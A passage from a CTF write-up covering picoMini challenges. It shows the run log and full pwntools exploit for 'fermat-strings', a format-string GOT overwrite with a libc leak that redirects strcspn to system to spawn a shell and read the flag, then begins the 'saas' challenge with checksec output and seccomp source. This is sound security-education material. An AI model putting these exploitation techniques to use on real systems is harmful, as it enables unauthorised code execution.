+/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/solve.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  r.recvuntil(&quot;Calculating for A: &quot;)
+[*] rewrote pow GOT to main
+/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/solve.py:58: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  r.sendline(&quot;1&quot;)
+/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/solve.py:59: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  r.recvuntil(&quot;Calculating for A: 1&quot;)
+/home/sky/Dropbox/ctf/picomini-by-redpwn/fermat-strings/solve.py:60: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  libc_start_main = int(r.recvuntil(&quot; &quot;),16)
+[*] leaked __libc_start_main: 0x7fbcecea00b3
+[*] leaked libc_base: 0x7fbcece79000
+[*] leaked libc_system: 0x7fbcecece410
+[*] Switching to interactive mode
+and B: 1
+Welcome to Fermat\&#39;s Last Theorem as a service
+A: B: Calculating for A: 11111111H\x10 and B: 1                                                                                                                                                                                                                                   400bd8                                                                                                                                                                                                            96c4941e      d8
+Welcome to Fermat\&#39;s Last Theorem as a service
+A: B: $ cat flag.txt
+picoCTF{f3rm4t_pwn1ng_s1nc3_th3_17th_c3ntury}
+Error: could not parse numbers!
+Welcome to Fermat\&#39;s Last Theorem as a service
+A: $  
+</span></code></pre><pre style="background-color:#212733;">
+<code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+
+</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">from </span><span style="color:#ccc9c2;">z3 </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">time
+</span><span style="color:#ffa759;">import </span><span style="color:#ccc9c2;">re
+exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;chall&quot;</span><span style="color:#ccc9c2;">)
+libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;./libc.so.6&quot;</span><span style="color:#ccc9c2;">)
+ld </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;./ld-2.31.so&quot;</span><span style="color:#ccc9c2;">)
+
+context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">binary </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">exe
+context</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">terminal </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;kitty&quot;
+
+</span><span style="color:#ccc9c2;">offset___libc_start_main_ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x270b3
+</span><span style="color:#ccc9c2;">offset_system </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0000000000055410
+
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">overflow</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">b</span><span style="color:#ccc9c2;">):
+    x </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Int</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&#39;x&#39;</span><span style="color:#ccc9c2;">)
+
+    solver </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Solver</span><span style="color:#ccc9c2;">()
+    solver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add</span><span style="color:#ccc9c2;">((x </span><span style="color:#f29e74;">+ </span><span style="color:#ccc9c2;">a) </span><span style="color:#f29e74;">% </span><span style="color:#ffcc66;">0xff </span><span style="color:#f29e74;">== </span><span style="color:#ccc9c2;">b</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">x </span><span style="color:#f29e74;">&gt; </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)
+    solver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">check</span><span style="color:#ccc9c2;">()
+    </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">solver</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">model</span><span style="color:#ccc9c2;">()[x]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">as_long</span><span style="color:#ccc9c2;">()
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">():
+    </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">REMOTE:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;mars.picoctf.net&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">31929</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffa759;">elif </span><span style="color:#ccc9c2;">args</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">GDB:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ccc9c2;">gdb</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">debug</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">gdbscript</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;c&quot;</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffa759;">else</span><span style="color:#ccc9c2;">:
+        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span style="color:#ccc9c2;">([ld</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">env</span><span style="color:#f29e74;">=</span><span style="color:#ccc9c2;">{</span><span style="color:#bae67e;">&quot;LD_PRELOAD&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ccc9c2;">libc</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">path})
+
+
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">():
+    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span style="color:#ccc9c2;">()
+
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;main address: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;main&#39;</span><span style="color:#ccc9c2;">]))
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;pow GOT address: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">got[</span><span style="color:#bae67e;">&#39;pow&#39;</span><span style="color:#ccc9c2;">]))
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;strcspn GOT address: &quot; </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">got[</span><span style="color:#bae67e;">&#39;strcspn&#39;</span><span style="color:#ccc9c2;">]))
+
+    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;11111111&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">got[</span><span style="color:#bae67e;">&#39;pow&#39;</span><span style="color:#ccc9c2;">])
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">got[</span><span style="color:#bae67e;">&#39;pow&#39;</span><span style="color:#ccc9c2;">]</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(payload)
+    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span style="color:#ccc9c2;">{(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;main&#39;</span><span style="color:#ccc9c2;">] </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x27</span><span style="color:#ccc9c2;">}</span><span style="color:#bae67e;">x&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">()
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%11$hhn&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span style="color:#ccc9c2;">{(</span><span style="color:#ffd580;">overflow</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x37</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">symbols[</span><span style="color:#bae67e;">&#39;main&#39;</span><span style="color:#ccc9c2;">] </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span style="color:#ccc9c2;">)) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">}</span><span style="color:#bae67e;">x&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">()
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%12$hhn&quot;
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(payload)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Calculating for A: &quot;</span><span style="color:#ccc9c2;">)
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;rewrote pow GOT to main&quot;</span><span style="color:#ccc9c2;">)
+
+    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%213$lx&quot;
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(payload)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;1&quot;</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;Calculating for A: 1&quot;</span><span style="color:#ccc9c2;">)
+    libc_start_main </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span style="color:#ccc9c2;">(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot; &quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2;">)
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;leaked __libc_start_main: </span><span style="color:#ccc9c2;">{</span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(libc_start_main)}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+    libc_base </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_start_main </span><span style="color:#f29e74;">- </span><span style="color:#ccc9c2;">offset___libc_start_main_ret
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;leaked libc_base: </span><span style="color:#ccc9c2;">{</span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(libc_base)}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    libc_system </span><span style="color:#f29e74;">= </span><span style="color:#ccc9c2;">libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ccc9c2;">offset_system
+    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;leaked libc_system: </span><span style="color:#ccc9c2;">{</span><span style="color:#f28779;">hex</span><span style="color:#ccc9c2;">(libc_system)}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2;">)
+
+    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;11111111&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">got[</span><span style="color:#bae67e;">&#39;strcspn&#39;</span><span style="color:#ccc9c2;">])
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">got[</span><span style="color:#bae67e;">&#39;strcspn&#39;</span><span style="color:#ccc9c2;">]</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p64</span><span style="color:#ccc9c2;">(exe</span><span style="color:#f29e74;">.</span><span style="color:#ccc9c2;">got[</span><span style="color:#bae67e;">&#39;strcspn&#39;</span><span style="color:#ccc9c2;">]</span><span style="color:#f29e74;">+</span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2;">)
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(payload)
+
+    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;1&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span style="color:#ccc9c2;">{</span><span style="color:#ffd580;">overflow</span><span style="color:#ccc9c2;">((</span><span style="color:#ffcc66;">0x2b</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">libc_system </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2;">}</span><span style="color:#bae67e;">x&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">()
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%11$hhn&quot;
+    </span><span style="color:#ccc9c2;">write_val </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">overflow</span><span style="color:#ccc9c2;">((</span><span style="color:#ffcc66;">0x10</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">(libc_system </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">8</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span style="color:#ccc9c2;">)
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%</span><span style="color:#ccc9c2;">{write_val}</span><span style="color:#bae67e;">x&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">()
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%12$hhn&quot;
+    </span><span style="color:#ccc9c2;">payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;%1$</span><span style="color:#ccc9c2;">{</span><span style="color:#ffd580;">overflow</span><span style="color:#ccc9c2;">(write_val</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ccc9c2;">(libc_system </span><span style="color:#f29e74;">&gt;&gt; </span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span style="color:#ccc9c2;">) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x10</span><span style="color:#ccc9c2;">}</span><span style="color:#bae67e;">hhx&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">encode</span><span style="color:#ccc9c2;">()
+    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;%13$hhn&quot;
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(payload)
+
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/bin/sh&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span style="color:#ccc9c2;">(</span><span style="color:#ffcc66;">0x100</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&#39;</span><span style="color:#ccc9c2;">))
+    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span style="color:#ccc9c2;">(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;hi&quot;</span><span style="color:#ccc9c2;">)
+
+    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+
+    </span><span style="color:#ccc9c2;">r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span style="color:#ccc9c2;">()
+
+
+</span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span style="color:#ccc9c2;">:
+    </span><span style="color:#ffd580;">main</span><span style="color:#ccc9c2;">()
+</span></code></pre>
+<p>Honestly not a great solution -- it's a little finicky and usually takes multiple executions to work but it got me the flag so I didn't care to fix it. </p>
+<h1 id="saas">saas</h1>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">Shellcode as a Service runs any assembly code you give it! For extra safety, you&#39;re not allowed to do a lot...
+
+nc mars.picoctf.net 31021
+</span></code></pre>
+<p>Again, we're provided <a href="/ctf/picomini-by-redpwn/saas/chall.c">source</a>, <a href="/ctf/picomini-by-redpwn/saas/chall">binary</a>, and <a href="/ctf/picomini-by-redpwn/saas/Dockerfile">Dockerfile</a>. </p>
+<pre style="background-color:#212733;">
+<code class="language-text" data-lang="text"><span style="color:#ccc9c2;">❯ checksec chall
+[*] &#39;/home/sky/Dropbox/ctf/picomini-by-redpwn/saas/chall&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</span></code></pre><pre style="background-color:#212733;">
+<code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;errno.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;error.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;fcntl.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;seccomp.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdio.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;string.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;sys/mman.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;sys/syscall.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;unistd.h&gt;
+
+</span><span style="color:#ffa759;">#define </span><span style="color:#73d0ff;">SIZE </span><span style="color:#ffcc66;">0x100
+
+</span><span style="font-style:italic;color:#5c6773;">// http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;arch=x86-64&amp;as_format=inline#assembly
+</span><span style="color:#ffa759;">#define </span><span style="color:#73d0ff;">HEADER </span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff</span><span style="color:#bae67e;">&quot;
+
+</span><span style="color:#ffa759;">#define </span><span style="color:#73d0ff;">FLAG_SIZE </span><span style="color:#ffcc66;">64
+
+</span><span style="color:#ffa759;">char</span><span style="color:#ccc9c2;"> flag[FLAG_SIZE]</span><span style="color:#ccc9c2cc;">;
+
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">load_flag</span><span style="color:#ccc9c2;">() {
+  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> fd</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">((fd </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span style="color:#ccc9c2;">(</span><span style="color:#bae67e;">&quot;flag.txt&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> O_RDONLY)) </span><span style="color:#f29e74;">== -</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffd580;">error</span><span style="color:#ccc9c2;">(EXIT_FAILURE</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> errno</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;open flag&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(</span><span style="color:#ffd580;">read</span><span style="color:#ccc9c2;">(fd</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> flag</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> FLAG_SIZE) </span><span style="color:#f29e74;">== -</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffd580;">error</span><span style="color:#ccc9c2;">(EXIT_FAILURE</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> errno</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;read flag&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(</span><span style="color:#ffd580;">close</span><span style="color:#ccc9c2;">(fd) </span><span style="color:#f29e74;">== -</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2;">)
+    </span><span style="color:#ffd580;">error</span><span style="color:#ccc9c2;">(EXIT_FAILURE</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> errno</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;close flag&quot;</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">}
+
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">setup</span><span style="color:#ccc9c2;">() {
+  scmp_filter_ctx ctx</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">  ctx </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">seccomp_init</span><span style="color:#ccc9c2;">(SCMP_ACT_KILL)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">int</span><span style="color:#ccc9c2;"> ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ffa759;">if </span><span style="color:#ccc9c2;">(ctx </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2;">) {
+    ret </span><span style="color:#f29e74;">|= </span><span style="color:#ffd580;">seccomp_rule_add</span><span style="color:#ccc9c2;">(ctx</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> SCMP_ACT_ALLOW</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">SCMP_SYS</span><span style="color:#ccc9c2;">(write)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,
+      </span><span style="color:#ffd580;">SCMP_A0</span><span style="color:#ccc9c2;">(SCMP_CMP_EQ</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> STDOUT_FILENO))</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">    ret </span><span style="color:#f29e74;">|= </span><span style="color:#ffd580;">seccomp_rule_add</span><span style="color:#ccc9c2;">(ctx</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> SCMP_ACT_ALLOW</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">SCMP_SYS</span><span style="color:#ccc9c2;">(exit)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">    ret </span><span style="color:#f29e74;">|= </span><span style="color:#ffd580;">seccomp_rule_add</span><span style="color:#ccc9c2;">(ctx</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ccc9c2;"> SCMP_ACT_ALLOW</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">SCMP_SYS</span><span style="color:#ccc9c2;">(exit_group)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2;">)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ccc9c2;">    ret </span><span style="color:#f29e74;">|= </span><span style="color:#ffd580;">seccomp_load</span><span style="color:#ccc9c2;">(ctx)</span><span style="color:#ccc9c2cc;">;
+  </span><span style="color:#ccc9c2;">}
+  </span><span style="color:#ffd580;">seccomp_release</span><span style="color:#ccc9c2;">(ctx)</span><span style="color:#ccc9c2cc;">;
